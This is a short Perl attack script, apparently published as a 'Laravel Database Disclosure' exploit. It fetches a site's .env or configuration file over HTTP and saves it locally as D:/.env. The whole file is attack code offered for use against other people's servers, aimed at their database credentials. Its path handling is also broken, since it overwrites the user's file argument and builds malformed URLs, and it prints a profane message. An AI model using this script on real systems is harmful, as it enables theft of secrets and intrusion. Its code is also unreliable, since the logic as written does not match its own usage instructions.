#!/usr/bin/perl -w
# Author : indoushka

use LWP::Simple;
use LWP::UserAgent;

system('cls');
print "\n[+] Laravel All version Database Disclosure [+] \n\n";
system('color a');


if(@ARGV < 2)
{
print "[+] Author : indoushka \n\n";
print "[-] How To Use\n\n";
&help; exit();
}
sub help()
{
print "[+] usage1 : perl $0 site.com /path/.env \n";
print "[+] usage2 : perl $0 localhost /.env \n";
}
($TargetIP, $path, $File,) = @ARGV;

$File="config/config.ini";
my $url = "http://" . $TargetIP . $path . $File;
print "\n Fuck you wait!!! \n\n";

my $useragent = LWP::UserAgent->new();
my $request = $useragent->get($url,":content_file" => "D:/.env");

if ($request->is_success)
{
print "[+] $url Exploited!\n\n";
print "[+] Database saved to D:/.env\n";
exit();
}
else
{
print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
exit();
}